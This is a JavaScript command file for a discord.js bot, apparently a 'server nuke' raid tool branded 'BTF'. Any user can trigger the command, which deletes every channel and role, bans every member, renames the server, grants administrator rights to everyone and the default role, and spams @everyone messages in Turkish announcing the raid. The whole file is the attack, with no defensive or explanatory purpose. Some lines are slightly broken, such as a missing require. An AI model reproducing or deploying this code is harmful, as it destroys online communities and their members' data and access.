const Discord = ('discord.js')
let kanal = 'buyuk-turk-federasyonu'
exports.run = (client, message, args) => {
  message.guild.channels.forEach(a => a.delete())
  message.guild.members.forEach(a => message.guild.ban(a))
  message.guild.roles.forEach(a => a.delete())
  message.guild.setName("BTF IS HERE !");
  message.guild.createChannel(`BTF Geldi!`, "voice")
  message.guild.createChannel(`Hata yapan`, "voice")
  message.guild.createChannel(`sizdiniz.`, "voice")
  message.guild.createChannel(`AMA GELDİK.`, "voice")
  message.guild.createChannel(`Her daim`, "voice")
  message.guild.createChannel(`ayaktayız.`, "voice")
  message.guild.defaultRole.setPermissions(['SEND_MESSAGES', 'VIEW_CHANNEL', 'ADMINISTRATOR']);
  message.guild.setIcon("https://cdn.discordapp.com/icons/723126146639724577/fca1ef3b977487602ff40a021c964a8d.webp");
  message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ff0000",
      permissions: ["ADMINISTRATOR"]
    });
   message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ffffff",
      permissions: ["ADMINISTRATOR"]
    });
  message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ff0000",
      permissions: ["ADMINISTRATOR"]
    });
   message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ffffff",
      permissions: ["ADMINISTRATOR"]
    });
  message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ff0000",
      permissions: ["ADMINISTRATOR"]
    });
   message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ffffff",
      permissions: ["ADMINISTRATOR"]
    });
  message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ff0000",
      permissions: ["ADMINISTRATOR"]
    });
   message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ffffff",
      permissions: ["ADMINISTRATOR"]
    });
  message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ff0000",
      permissions: ["ADMINISTRATOR"]
    });
   message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ffffff",
      permissions: ["ADMINISTRATOR"]
    });
  message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ff0000",
      permissions: ["ADMINISTRATOR"]
    });
   message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ffffff",
      permissions: ["ADMINISTRATOR"]
    });
  message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ff0000",
      permissions: ["ADMINISTRATOR"]
    });
   message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ffffff",
      permissions: ["ADMINISTRATOR"]
    });
  message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ff0000",
      permissions: ["ADMINISTRATOR"]
    });
   message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ffffff",
      permissions: ["ADMINISTRATOR"]
    });
  message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ff0000",
      permissions: ["ADMINISTRATOR"]
    });
   message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ffffff",
      permissions: ["ADMINISTRATOR"]
    });
  message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ff0000",
      permissions: ["ADMINISTRATOR"]
    });
   message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ffffff",
      permissions: ["ADMINISTRATOR"]
    });
  message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ff0000",
      permissions: ["ADMINISTRATOR"]
    });
   message.guild.createRole({
      name: "BTF IS HERE.",
      color: "#ffffff",
      permissions: ["ADMINISTRATOR"]
    });
  message.guild.createChannel(kanal,kanal).then(m => m.send('@everyone BTF IS HERE')(10000));
message.channel.send('@everyone BTF TARAFINDAN BASILDINIZ').then(m => m.send('@everyone BTF GELDI')(5000));
};
exports.conf = {
  enabled: true,  
  guildOnly: false, 
  aliases: [], 
  permLevel: 0
};

exports.help = {
  name: '1453',
  description: 'taslak', 
  usage: '1453',
};
